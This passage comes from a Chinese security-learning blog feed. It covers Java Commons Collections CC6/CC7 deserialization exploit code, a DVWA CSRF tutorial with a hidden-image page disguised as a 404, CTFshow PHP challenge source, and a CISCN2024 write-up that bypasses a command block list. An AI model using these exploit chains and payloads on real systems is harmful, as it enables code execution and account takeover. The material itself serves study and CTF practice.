&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodeField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\24882\\Desktop\\java-sec\\cc\\src\\test\\java\\test_calc.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodeField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        Map map=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map lazyMap=LazyMap.decorate(map, transformer);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,templates);</span><br><span class="line">        BadAttributeValueExpException obj=<span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        Field val=obj.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(obj,tiedMapEntry);</span><br><span class="line">        Field iMethodName=transformer.getClass().getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">        iMethodName.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        iMethodName.set(transformer,<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line">        lazyMap.remove(templates);</span><br><span class="line">        <span class="comment">//tiedMapEntry.toString();</span></span><br><span class="line">        Serializ(obj);</span><br><span class="line">        Unserializ(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h1><p>CC7也一样是换了一种方式来触发LazyMap的CC链子<br>EXP如下<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.AbstractMapDecorator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serializ</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ByteArrayOutputStream bos=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">byte</span>[] byteArray = bos.toByteArray();</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> encoder.encodeToString(byteArray);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Unserializ</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">tmpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class clazz=tmpl.getClass();</span><br><span class="line">        Field namefeld= clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        namefeld.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        namefeld.set(tmpl,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Field bytefeld= clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytefeld.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\24882\\Desktop\\java-sec\\cc\\src\\test\\java\\test_calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes= &#123;code&#125;;</span><br><span class="line">        bytefeld.set(tmpl,bytecodes);</span><br><span class="line">        Field tfactoryfeld= clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryfeld.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryfeld.set(tmpl,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        Transformer[] Transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;tmpl&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">2</span>)&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap1.put(<span class="string">&quot;pP&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap2.put(<span class="string">&quot;oo&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(innerMap1, chainedTransformer);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(innerMap2, chainedTransformer);</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(lazyMap1,<span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2,<span class="number">2</span>);</span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;pP&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz2</span> <span class="operator">=</span> ChainedTransformer.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz2.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(chainedTransformer,Transformer);</span><br><span class="line"></span><br><span class="line">        Serializ(hashtable);</span><br><span class="line">        Unserializ(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<img src="/2024/09/25/CC%E9%93%BE/CC.png" class="" title="alt text">
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>CSRF</title>
    <url>/2024/01/05/CSRF/</url>
    <content><![CDATA[<p>所谓CSRF就是（Cross-site request forgery），中文名称：跨站请求伪造</p>
<h1 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h1><p>用户A在浏览器登陆了网站B，这时候服务器会发送cookie给浏览器，而这时如果用户访问了危险网站C,这时C会发送一个访问网页B的请求，而这些请求中往往会进行一些危险操作，如修改用户密码，甚至更加严重。<br><img src="/2024/01/05/CSRF/1.jpg" class="" title="Alt text"></p>
<h1 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h1><p>假设一个转帐网站存子CSRF漏洞，这时张三要进行转账，这时正常转账的请求假设为<code>http://bank.example/withdraw?account=张三&amp;amount=1&amp;for=李四</code>这时正常的将张三的1元转给了李四，但是这时如果张三没有将转账网站的账号登出，并且访问了黑客制作的危险网站，这时危险网站发送了一个请求为<code>http://bank.example/withdraw?account=张三&amp;amount=1000000&amp;for=黑客</code>这时钱就转到了黑客手里，这主要的原因是转账网页服务器没有进行严格的过滤，导致危险网站发起了一个危险请求且成功访问，并且张三没有登出导致了浏览器存储着账号的cookie，这时危险网站发起的请求就携带了cookie被转账网站误以为是用户。</p>
<h1 id="DVMA-CSRF"><a href="#DVMA-CSRF" class="headerlink" title="DVMA-CSRF"></a>DVMA-CSRF</h1><h1 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h1><p>这个LOW难度我们查看源码可以发现只有两次秘密相同就可以成功修改密码没有进行任何过滤并且其密码是使用GET传值，我们尝试修改一下密码，得到url为<code>http://192.168.32.1/DVWA-master/vulnerabilities/csrf/?password_new=2&amp;password_conf=2&amp;Change=Change#</code>这时候我们将其进行修改<code>http://192.168.32.1/DVWA-master/vulnerabilities/csrf/?password_new=3333&amp;password_conf=3333&amp;Change=Change#</code>之后再其他网页访问发现，成功将密码修改为了3333但是这种方法属实是有点傻，这时候我们有以下两种方法进行修改</p>
<h2 id="1。短链"><a href="#1。短链" class="headerlink" title="1。短链"></a>1。短链</h2><p>我们可以使用短链生成工具的在线网站将该链接进行转换。</p>
<h2 id="2："><a href="#2：" class="headerlink" title="2："></a>2：</h2><p>我们可以使用如下html文件将html文件放在web里，这时候网页会自动发送请求。该方法更加隐蔽也常用代码如下<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSRF<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.32.1/DVWA-master/vulnerabilities/csrf/?password_new=3333&amp;password_conf=3333&amp;Change=Change#&quot;</span><span class="attr">border</span>=<span class="string">&quot;0&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">    404<span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">h2</span>&gt;</span></span><br><span class="line">           file not found.<span class="tag">&lt;<span class="name">h2</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>这时候我们访问该网站会显示404这回使用户误认为访问错误了，但是其实密码已经被修改了。<br><img src="/2024/01/05/CSRF/2.png" class="" title="Alt text"></p>
<h1 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h1><img src="/2024/01/05/CSRF/3.png" class="" title="Alt text">
<p>我们查看代码发现比LOW多了个<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">stripos</span>( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;HTTP_REFERER&#x27;</span> ] ,<span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="literal">false</span> )</span><br></pre></td></tr></table></figure><br>这个代码的作用使匹配我们发送的referer头查看是否为服务器名称，如果referer里含有服务器名称则修改密码。<br>这时候我们可以直接将html文件改为主机名称。这样子再发送时referer头就回包含主机名称</p>
<h1 id="high"><a href="#high" class="headerlink" title="high"></a>high</h1><p>high难度的因为其需要运用到xss的内容再学习网xss后再补充。</p>
]]></content>
      <categories>
        <category>top10</category>
        <category>CSRF</category>
      </categories>
      <tags>
        <tag>top10</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFSHOW</title>
    <url>/2024/10/02/CTFSHOW/</url>
    <content><![CDATA[<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&#x27;init.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addUser</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;娣诲姞鎴愬姛&#x27;</span></span><br><span class="line">	);</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">existsUser</span>(<span class="variable">$data</span>,<span class="variable">$username</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="variable">$s</span> = <span class="variable">$data</span>.<span class="variable">$username</span>.<span class="string">&#x27;@&#x27;</span>.<span class="variable">$password</span>.<span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">		<span class="title function_ invoke__">file_put_contents</span>(DB_PATH, <span class="variable">$s</span>);</span><br><span class="line"></span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;code&#x27;</span>]=-<span class="number">1</span>;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;鐢ㄦ埛宸插瓨鍦�&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateUser</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;鏇存柊鎴愬姛&#x27;</span></span><br><span class="line">	);</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">existsUser</span>(<span class="variable">$data</span>,<span class="variable">$username</span>)&gt;<span class="number">0</span> &amp;&amp; <span class="variable">$username</span>!=<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">		<span class="variable">$s</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;@[0-9a-zA-Z]+\|/&#x27;</span>, <span class="variable">$username</span>.<span class="string">&#x27;@&#x27;</span>.<span class="variable">$password</span>.<span class="string">&#x27;|&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">		<span class="title function_ invoke__">file_put_contents</span>(DB_PATH, <span class="variable">$s</span>);</span><br><span class="line"></span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;code&#x27;</span>]=-<span class="number">1</span>;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;鐢ㄦ埛涓嶅瓨鍦ㄦ垨鏃犳潈鏇存柊&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delUser</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$username</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;鍒犻櫎鎴愬姛&#x27;</span></span><br><span class="line">	);</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">existsUser</span>(<span class="variable">$data</span>,<span class="variable">$username</span>)&gt;<span class="number">0</span> &amp;&amp; <span class="variable">$username</span>!=<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">		<span class="variable">$s</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;@[0-9a-zA-Z]+\|/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">		<span class="title function_ invoke__">file_put_contents</span>(DB_PATH, <span class="variable">$s</span>);</span><br><span class="line"></span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;code&#x27;</span>]=-<span class="number">1</span>;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;鐢ㄦ埛涓嶅瓨鍦ㄦ垨鏃犳潈鍒犻櫎&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">existsUser</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$username</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;@[0-9a-zA-Z]+\|/&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">initCache</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache.php&#x27;</span>)?:<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;cache.php&#x27;</span>,<span class="string">&#x27;&lt;!-- ctfshow-web-cache --&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clearCache</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;rm -rf cache.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">flushCache</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache.php&#x27;</span>) &amp;&amp; <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;cache.php&#x27;</span>)===<span class="literal">false</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> FLAG646;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">netTest</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;鍛戒护鎵ц澶辫触&#x27;</span></span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ping ((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;)(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;))&#123;3&#125;/&#x27;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line">		<span class="variable">$res</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line">		<span class="title function_ invoke__">stripos</span>(PHP_OS,<span class="string">&#x27;WIN&#x27;</span>)!==<span class="literal">FALSE</span>?<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="title function_ invoke__">iconv</span>(<span class="string">&quot;GBK&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="variable">$res</span>):<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="variable">$res</span>;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[A-Za-z]+$/&#x27;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line">		<span class="variable">$res</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line">		<span class="title function_ invoke__">stripos</span>(PHP_OS,<span class="string">&#x27;WIN&#x27;</span>)!==<span class="literal">FALSE</span>?<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="title function_ invoke__">iconv</span>(<span class="string">&quot;GBK&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="variable">$res</span>):<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="variable">$res</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCN2024初赛复现</title>
    <url>/2024/05/20/CISCN2024%E5%88%9D%E8%B5%9B%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="这个比赛也是我第一次打的比较大的比赛，为此我还在赛前把前几年的题目都刷了一下，结果今年的题目怎么变异了，这么难（道心给整碎了），为此我写下这篇博客来复现学习。"><a href="#这个比赛也是我第一次打的比较大的比赛，为此我还在赛前把前几年的题目都刷了一下，结果今年的题目怎么变异了，这么难（道心给整碎了），为此我写下这篇博客来复现学习。" class="headerlink" title="这个比赛也是我第一次打的比较大的比赛，为此我还在赛前把前几年的题目都刷了一下，结果今年的题目怎么变异了，这么难（道心给整碎了），为此我写下这篇博客来复现学习。"></a>这个比赛也是我第一次打的比较大的比赛，为此我还在赛前把前几年的题目都刷了一下，结果今年的题目怎么变异了，这么难（道心给整碎了），为此我写下这篇博客来复现学习。</h1><h1 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h1><p>这题在比赛的时候其实已经差不多做出来了，可是出题人把flag藏到了数据库里。。。。<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); </span><br><span class="line">     <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">         <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>首先可以看到其使用了escapeshellcmd函数<br><img src="/2024/05/20/CISCN2024%E5%88%9D%E8%B5%9B%E5%A4%8D%E7%8E%B0/1.png" class="" title="alt text"><br>这个函数机会将所有与命令执行有关的函数都进行了转义，在打比赛的时候并没有找到怎么绕过这个函数。我再网上看到了两种绕法<br><strong>1</strong>.在打比赛期间我们用的是php -r 来执行php代码，由于php -r和是将字符串当成php命令来执行所以其即使字符被转义也不影响执行。那么这样就可以执行php代码。<br><strong>2</strong>.我再赛后看其他师傅的wp知道了，liunx系统竟然也有eval函数。那么直接使用eval l\s这样就可以绕过waf和escapesshellcmd函数。（可以用系统自带的eval来绕过escapeshellcmd，这么简单的绕法再网上竟然查不到）</p>
